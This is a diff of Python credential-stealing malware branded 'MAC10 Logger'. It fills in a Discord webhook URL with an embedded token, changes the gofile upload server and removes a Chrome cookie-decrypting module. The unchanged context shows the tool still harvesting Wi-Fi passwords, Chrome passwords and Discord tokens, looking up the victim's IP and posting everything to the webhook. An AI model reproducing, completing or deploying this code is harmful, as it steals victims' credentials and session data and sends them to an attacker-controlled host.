@@ -22,7 +22,7 @@ from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 from util.screenshot import screenshot
 
 class VARIABLES:
-    webhook    = "webhookhere"
+    webhook    = "https://discord.com/api/webhooks/1135745003604430878/MTjCGvBPLpLeWeLTfeZg4RNzl2jP4pToaLtrZ1CnvFl4y4Ai6dojaYnCejzkCPdFmBjM"
     printOnEnd = True 
     endText    = "PROGRAM FINISHED"
     user = os.path.expanduser("~")
@@ -49,7 +49,7 @@ class Mac10:
             return f"C:\\ProgramData\\{rnd}.txt"
 
         def UploadFile(self, filepath, filename="File") -> str:
-            server = 'https://store1.gofile.io/uploadFile'
+            server = 'https://store2.gofile.io/uploadFile'
             try:
                 file = {'file': open(filepath, "rb")}
                 resp = post(server, files=file).json()
@@ -196,13 +196,6 @@ class Mac10:
                     return LOGGER.UploadFile(randomfilename, filename="Chrome Passwords")
 
 
-        class GetChromeCookies:
-            def __init__(self):
-                local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-                with open(local_state_path, "r", encoding="utf-8") as f: local_state = json.loads(f.read())
-                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-                self.key = CryptUnprotectData(key, None, None, None, 0)[1]
-
             def TimeReadable(self, chromedate):
                 if chromedate != 86400000000 and chromedate:
                     try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
@@ -220,45 +213,6 @@ class Mac10:
                     try: return str(CryptUnprotectData(data, None, None, None, 0)[1])
                     except: return ""
 
-            def Main(self):
-                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-                filename = "Cookies.db"
-                if not os.path.isfile(filename):
-                    shutil.copyfile(db_path, filename)
-                db = sqlite3.connect(filename)
-                db.text_factory = lambda b: b.decode(errors="ignore")
-                cursor = db.cursor()
-                cursor.execute("""
-                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
-                FROM cookies""")
-                key = self.key
-                try:
-                    randomfilename = LOGGER.RndFileName()
-                    with open(randomfilename, 'w', encoding="utf-8") as file:
-                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
-                            decrypted_value = self.DecryptData(encrypted_value, key) if not value else value
-                            file.write(f"""
-                                ------------MAC10 Logger | .gg/kos | security------------
-                                
-                                URL: {host_key}
-                                Cookie name: {name}
-                                Cookie value (encrypted): {encrypted_value}
-                                Cookie value (decrypted): {decrypted_value}
-                                Creation date: {self.TimeReadable(creation_utc)}
-                                Last accessed: {self.TimeReadable(last_access_utc)}
-                                Expires at: {self.TimeReadable(expires_utc)}
-                            """)
-                            cursor.execute("""
-                            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
-                            WHERE host_key = ?
-                            AND name = ?""", (decrypted_value, host_key, name))
-                        file.close()
-                    db.commit()
-                    db.close()
-                    return LOGGER.UploadFile(randomfilename, filename="Chrome Cookies")
-                except Exception as error:
-                    LOGGER.errors += f"{error}\n"
-                    return "No Chrome Cookie File"
 
 
         class DiscordTokens:
@@ -330,14 +284,11 @@ class Mac10:
             import requests
             WifiPass   = self.GetWifiPasswords()
             ChromePass = self.GetChromePasswords()
-            ChromeCks  = self.GetChromeCookies()
             DiscTokens = self.DiscordTokens()
             wifi_passwords   = WifiPass.Main()
             chrome_passwords = ChromePass.Main()
-            chrome_cookies   = ChromeCks.Main()
             discord_tokens   = DiscTokens.Main()
 
-            
             
 
             data = requests.get("https://ipinfo.io/json").json()
@@ -377,7 +328,7 @@ class Mac10:
                             },
                             {
                                 "name": "<:zstar4:1124052448793862174> **System Files**",
-                                "value": f"<:wh_star:1102019798390542426>**{discord_tokens[0]}**\n<:wh_star:1102019798390542426>**{wifi_passwords}**\n<:wh_star:1102019798390542426>**{chrome_passwords}**\n<:wh_star:1102019798390542426>**{chrome_cookies}**\n<:wh_star:1102019798390542426>**{self.ErrorLog()}**"
+                                "value": f"<:wh_star:1102019798390542426>**{discord_tokens[0]}**\n<:wh_star:1102019798390542426>**{wifi_passwords}**\n<:wh_star:1102019798390542426>**{chrome_passwords}**\n<:wh_star:1102019798390542426>**{self.ErrorLog()}**"
                             },
                         ],
                         "author": {
